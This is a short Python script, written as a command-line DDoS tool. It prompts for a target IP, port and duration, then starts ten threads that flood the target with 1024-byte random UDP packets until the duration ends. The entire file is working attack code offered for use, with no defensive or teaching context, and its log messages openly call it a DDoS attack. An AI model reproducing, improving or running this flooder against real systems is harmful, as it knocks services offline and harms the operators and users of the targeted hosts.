#!/usr/bin/python

import os
import socket
import time
import random
import sys
import threading
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Define colors for terminal output
COLORS = {
    "white": "\033[1;37m",
    "red": "\033[0;31m",
    "green": "\033[1;32m",
    "yellow": "\033[1;33m",
    "purple": "\033[1;35m"
}

def clear_console():
    """Clear the console screen."""
    os.system('cls' if os.name == 'nt' else 'clear')

def doss(ip, port, duration):
    """Start the DDoS attack."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payloads = random._urandom(1024)
    
    clear_console()
    logging.info(f"Starting DDoS attack on {ip}:{port} for {duration} seconds.")
    
    threads = []
    start_time = time.time()

    for _ in range(10):  # Create 10 threads
        t = threading.Thread(target=send_packets, args=(sock, payloads, ip, port, duration, start_time))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

def send_packets(sock, payloads, ip, port, duration, start_time):
    """Send packets to the target until duration expires."""
    while time.time() - start_time < duration:
        try:
            sock.sendto(payloads, (ip, port))
        except socket.error as e:
            logging.error(f"Socket error: {e}")
            break
        except Exception as e:
            logging.error(f"Unexpected error: {e}")
            break

def main():
    """Handle user input and initiate the attack."""
    try:
        clear_console()
        ip = input(COLORS["yellow"] + "[*] Enter IP or Host Target: " + COLORS["white"])
        port = input(COLORS["yellow"] + "[*] Enter Port [Default: 80]: " + COLORS["white"])
        port = int(port) if port else 80
        duration = int(input(COLORS["red"] + "[*] Enter Duration (seconds): " + COLORS["white"]))

        doss(ip, port, duration)
    except ValueError:
        logging.error("Invalid input. Please enter valid data.")
    except KeyboardInterrupt:
        logging.info("Program interrupted by user.")
        sys.exit()

if __name__ == "__main__":
    main()
